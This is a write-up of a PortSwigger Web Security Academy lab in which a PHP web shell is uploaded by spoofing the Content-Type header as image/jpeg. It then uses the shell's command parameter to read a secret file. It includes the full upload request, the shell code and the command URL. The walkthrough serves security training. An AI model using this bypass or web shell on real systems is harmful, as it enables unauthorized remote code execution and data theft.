# [Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file  `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials:  `wiener:peter`

## Analysis

server-side depends on Content-Type header to determine filetype, but this can be modified on client-side

## Exploit

1. Try directly upload shellcode like [previous lab](./1.%20Remote%20code%20execution%20via%20web%20shell%20upload.md):

    ```text
    Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
    ```

2. Modify Content-Type header:

    ```http
    POST /my-account/avatar HTTP/1.1
    ...
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryumgvvXvThFvAApaR
    ...

    ------WebKitFormBoundaryumgvvXvThFvAApaR

    Content-Disposition: form-data; name="avatar"; filename="test.php"
    Content-Type: image/jpeg

    <?php echo system($_GET['command']); ?>
    ...
    ```

    =\> successfully uploaded `test.php` file

3. Select `open image in new tab` to get image's link: <https://lab-id.web-security-academy.net/files/avatars/test.php>
4. Access shellcode:

    ```url
    https://0a8e003c04c7a1f3c0b26d8e006e009b.web-security-academy.net/files/avatars/test.php?command=cat+/home/carlos/secret
    ```

result:

```text
895Pamr13huKgEVjGMmb1wZXi1F5Bwc2895Pamr13huKgEVjGMmb1wZXi1F5Bwc2
```

flag is still repeated twice
